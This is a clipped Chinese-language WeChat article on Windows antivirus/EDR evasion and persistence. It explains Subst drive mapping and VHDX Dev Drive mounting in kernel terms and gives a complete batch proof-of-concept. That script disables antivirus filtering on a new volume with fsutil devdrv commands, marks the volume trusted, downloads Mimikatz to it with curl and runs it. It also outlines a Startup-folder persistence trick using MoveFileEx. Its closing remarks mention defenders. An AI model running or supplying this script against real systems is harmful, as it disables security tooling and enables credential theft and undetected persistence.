---
title: 【微信】从 Subst 到 VHDX，一种设计上绕过杀软的代码执行、过启动项，权限维持方式
source: https://mp.weixin.qq.com/s/pfG-KR1GBfOln0XJK6HKSw
source_host: mp.weixin.qq.com
clip_date: 2026-09-23T19:23:27+08:00
trace_id: 8680d32b-5079-4712-81d0-99bc1768b7f0
content_hash: 9524ba63cfa8aae3282b14a276a5b28d28020f20b0cf979c0de8c83c8e12dcd5
status: synced
tags:
  - 微信
  - 免杀对抗
  - 内核
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 通过 Subst 映射驱动器或挂载 VHDX 卷，把恶意文件写入 EDR 未监控的“新路径”，是同一底层原理的两种免杀执行与启动项维持方式。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3e475244-d011-8168-a6e7-cd686c793500
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 通过 Subst 映射驱动器或挂载 VHDX 卷，把恶意文件写入 EDR 未监控的“新路径”，是同一底层原理的两种免杀执行与启动项维持方式。
> 
> - **共同原理：** 二者都利用对象管理器在命名空间中插入新的路径入口；`C:\`、`D:\` 本身就是指向 `\Device\HarddiskVolumeN` 的符号链接。
> - **Subst 方案：** 把启动目录映射为 `X:`（不创建新卷，仅路径跳转），再用 `MoveFileEx` + `MOVEFILE_DELAY_UNTIL_REBOOT` 安排重启后移入 `X:\Startup`，配合自定义文件关联触发执行。
> - **VHDX 方案：** 用 `diskpart` 创建并挂载可扩展 VHDX 为 `B:`，`format b: /devdrv` 后依次执行 `fsutil devdrv enable /disallowAv`、`clearFiltersAllowed b:`、`trust b:` 使该卷被信任，再向 `B:` 下载并运行 Mimikatz。
> - **绕过关键：** 路径解析发生在 IRP 下发之前，Minifilter 回调拿到的可能是解析前或解析后的路径；EDR 监控“路径字符串”，内核操作“设备对象”，映射关系即攻击空间。
> - **防守视角：** 需理解内核对象、符号链接、IRP 流程与启动阶段，对应《Windows Internals 7》第 10 章文件系统、第 3 章对象管理器。

**老鑫安全** *2026年9月23日 18:51*

之前我们分享过一篇利用 `Subst` 驱动器映射 + `MoveFileEx` 延迟移动 + 自定义文件关联绕过 360启动项的文章

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b2adaaea8bfc1f84.png)

最近读《Windows Internals 7》看到 **同一个底层原理的两种不同实现**

**旧文（Subst 方案）：**

1.  用 `Subst` 把启动目录映射成 `X:` 盘
    
2.  把恶意文件写入普通目录
    
3.  用 `MoveFileEx(..., MOVEFILE_DELAY_UNTIL_REBOOT)` 安排重启后移动到 `X:\Startup`
    
4.  注册自定义文件关联（如 `.nb` → `wscript.exe` ）触发执行
    

**新文（VHDX 方案）：**

1.  用 `diskpart` 创建并挂载 VHDX 为 `B:` 盘
    
2.  用 `fsutil devdrv trust b:` 让杀软信任该卷
    
3.  把 Mimikatz 下载到 `B:` 盘并执行
    

```bash
@echo off
setlocal enabledelayedexpansion
title Mimikatz VHDX Bypass POC

:: ==========================================
:: 阶段 1: 禁用防御与准备环境
:: ==========================================
echo [*] Phase 1: Disabling defenses and preparing environment...

:: 尝试开启 DevDrv 功能并禁用杀软（视系统版本和权限而定）
fsutil devdrv enable
fsutil devdrv enable /disallowAv

:: 创建临时工作目录
if not exist "c:\temp\mimi" md "c:\temp\mimi"
cd /d "c:\temp\mimi"

:: 生成 diskpart 脚本，创建 10GB 可扩展 VHDX 虚拟磁盘
echo create vdisk file="c:\temp\mimi\mimi.vhdx" maximum=10240 type=expandable > diskpart.txt
echo select vdisk file="c:\temp\mimi\mimi.vhdx" >> diskpart.txt
echo attach vdisk >> diskpart.txt
echo create partition primary >> diskpart.txt
echo assign letter=b >> diskpart.txt
echo exit >> diskpart.txt

:: 执行 diskpart 挂载虚拟磁盘
echo [*] Creating and attaching VHDX as Drive B:...
diskpart /s "c:\temp\mimi\diskpart.txt"

:: 格式化 B 盘
echo [*] Formatting Drive B:...
format b: /devdrv /q /y

:: ==========================================
:: 阶段 2: 绕过检测 (AV Evasion)
:: ==========================================
echo [*] Phase 2: Bypassing AV filters on Drive B:...

:: 清除针对 B 盘的过滤器并信任该卷
fsutil devdrv clearFiltersAllowed b:
fsutil devdrv trust b:
fsutil devdrv query b:

:: ==========================================
:: 阶段 3: 下载与执行 Payload
:: ==========================================
echo [*] Phase 3: Downloading and executing Mimikatz...

:: 用Mimikatz 测试
set "MIMI_URL=https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

:: 下载到受信任的 B 盘
echo [*] Downloading Mimikatz to B:\mimi.zip...
curl -L "%MIMI_URL%" -o b:\mimi.zip

:: 切换到 B 盘并解压
b:
echo [*] Extracting...
tar -xf b:\mimi.zip

:: 进入 x64 目录并执行 Mimikatz
cd x64
echo [*] Launching Mimikatz...
mimikatz.exe

:: 脚本结束，保持窗口打开以便观察
echo.
echo [*] POC Execution Finished.
pause
```

您的浏览器不支持 video 标签

《Windows Internals 7》不仅是一本参考书，更是红蓝对抗的“兵法”。理解内核对象、符号链接、IRP 处理流程和启动阶段，能帮助防守方看清攻击者的真实意图，也能帮助红队找到更隐蔽的突破口。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ec983dc86440b9a5.png)

**攻防之路，始于底层，成于细节。**

****攻击者的每一个“奇技淫巧”，背后都是对 Windows 底层机制的深刻理解。**  
**防守者的每一次进化，也都离不开对内核的敬畏****

**答案在第 10 章“文件系统”和第 3 章“对象管理器”中**

### 核心概念：符号链接（Symbolic Link）与卷挂载

Windows 对象管理器用 **符号链接** 来管理设备命名空间。我们平时看到的 `C:\` 、 `D:\` 其实都是符号链接，指向真正的卷设备对象（如 `\Device\HarddiskVolume3` ）。

-   **`Subst` 做的事**：创建一个 DOS Device 符号链接，把 `\??\X:` 指向 `\??\C:\SomeFolder` 。它 **没有创建新的卷**，只是在路径解析层面做了一个“跳转”。
    
-   **VHDX 挂载做的事**：创建一个新的卷设备对象（ `\Device\HarddiskVolumeN` ），然后创建一个符号链接 `\??\B:` 指向它。它 **创建了一个真实的卷**。
    

**共同点：两者都在对象管理器的命名空间中“插入”了一个新的路径入口。**

### EDR 为什么会被绕过？

EDR 的文件监控通常依赖 **Minifilter 驱动**，挂在 `FltMgr` 上，通过 `IRP_MJ_CREATE` 、 `IRP_MJ_WRITE` 等回调获取文件操作。

这里的关键在于 **路径解析的时机**：

-   当进程访问 `X:\test.nb` 时，I/O 管理器需要把 `X:` 解析成真实的设备路径。这个解析过程发生在 **IRP 下发之前**。
    
-   Minifilter 在回调中拿到的 `FileObject->FileName` 或 `FileObject->RelatedFileObject` ， **可能是解析后的真实路径，也可能是解析前的路径**，取决于 EDR 的实现和挂载点位置。
    
-   如果 EDR 只监控 `C:\Users\...\Startup` 这个 **字面路径**，而攻击者通过 `X:\Startup` 访问，EDR 可能根本不会触发告警。
    

**一句话总结：EDR 监控的是“路径字符串”，而 Windows 内核操作的是“设备对象”。两者之间的映射关系，就是攻击者的操作空间。**

| 特性  | VHDX + `fsutil devdrv` | `Subst`<br><br>\+ `MoveFileEx` |
| --- | --- | --- |
| **核心机制** | 创建虚拟磁盘文件，挂载为独立卷 | 将本地文件夹映射为虚拟驱动器号 |
| **信任机制** | `fsutil devdrv trust b:` | 修改注册表 `DOS Devices` 实现持久化 |
| **落地方式** | 直接写入 B 盘并执行 | 写入映射目录，利用 `MoveFileEx` 延迟移动 |
| **EDR 视野** | 文件写入受信任卷 | 文件被“移动”到 Z:\\ 盘 |

两者都是利用 Windows 对象管理器（Object Manager）中 **符号链接（Symbolic Link）** 的特性，让 EDR 的文件过滤驱动在路径解析上产生“错觉”。

免杀 · 目录
